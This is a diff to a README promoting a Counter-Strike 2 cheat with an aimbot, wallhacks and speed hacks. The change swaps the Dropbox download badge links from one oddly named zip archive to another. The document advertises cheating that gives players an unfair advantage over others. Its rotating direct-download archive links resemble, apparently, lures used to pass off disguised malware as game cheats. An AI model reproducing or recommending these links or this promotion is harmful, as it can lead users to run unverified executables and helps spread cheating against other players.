@@ -2,7 +2,7 @@
 
 A cheat for *Counter-Strike 2* that provides players with a variety of modifications to enhance or alter gameplay. This cheat includes features such as aimbots, wallhacks, speed hacks, and other cheats that give players an unfair advantage over others. These modifications allow players to manipulate game mechanics, making it easier to win matches or perform actions that would typically be impossible in standard gameplay.
 
-[![Download CS2 Cheat](https://img.shields.io/badge/Download-CS2%20Cheat-blueviolet)](https://www.dropbox.com/scl/fi/nnpjxw1svv1mk8ujarq82/Specialty.zip?rlkey=0wd03l5wgxhjcg0kf4btaozu2&st=qs5u0021&dl=1)
+[![Download CS2 Cheat](https://img.shields.io/badge/Download-CS2%20Cheat-blueviolet)](https://www.dropbox.com/scl/fi/klw7z4tepkx9g45pgddss/MLirins.zip?rlkey=7lmdylzkes5g9miusxhpap4t1&st=798fuxoz&dl=1)
 
 **Key Features**:
 - **Aimbot**: Automatically targets enemies, providing perfect accuracy.
@@ -18,4 +18,4 @@ A cheat for *Counter-Strike 2* that provides players with a variety of modificat
 2. Follow the installation instructions provided in the readme.
 3. Launch *Counter-Strike 2* and activate the cheat with the specified hotkeys.
 
-[![Download CS2 Cheat](https://img.shields.io/badge/Download-CS2%20Cheat-blueviolet)](https://www.dropbox.com/scl/fi/nnpjxw1svv1mk8ujarq82/Specialty.zip?rlkey=0wd03l5wgxhjcg0kf4btaozu2&st=qs5u0021&dl=1)
+[![Download CS2 Cheat](https://img.shields.io/badge/Download-CS2%20Cheat-blueviolet)](https://www.dropbox.com/scl/fi/klw7z4tepkx9g45pgddss/MLirins.zip?rlkey=7lmdylzkes5g9miusxhpap4t1&st=798fuxoz&dl=1)
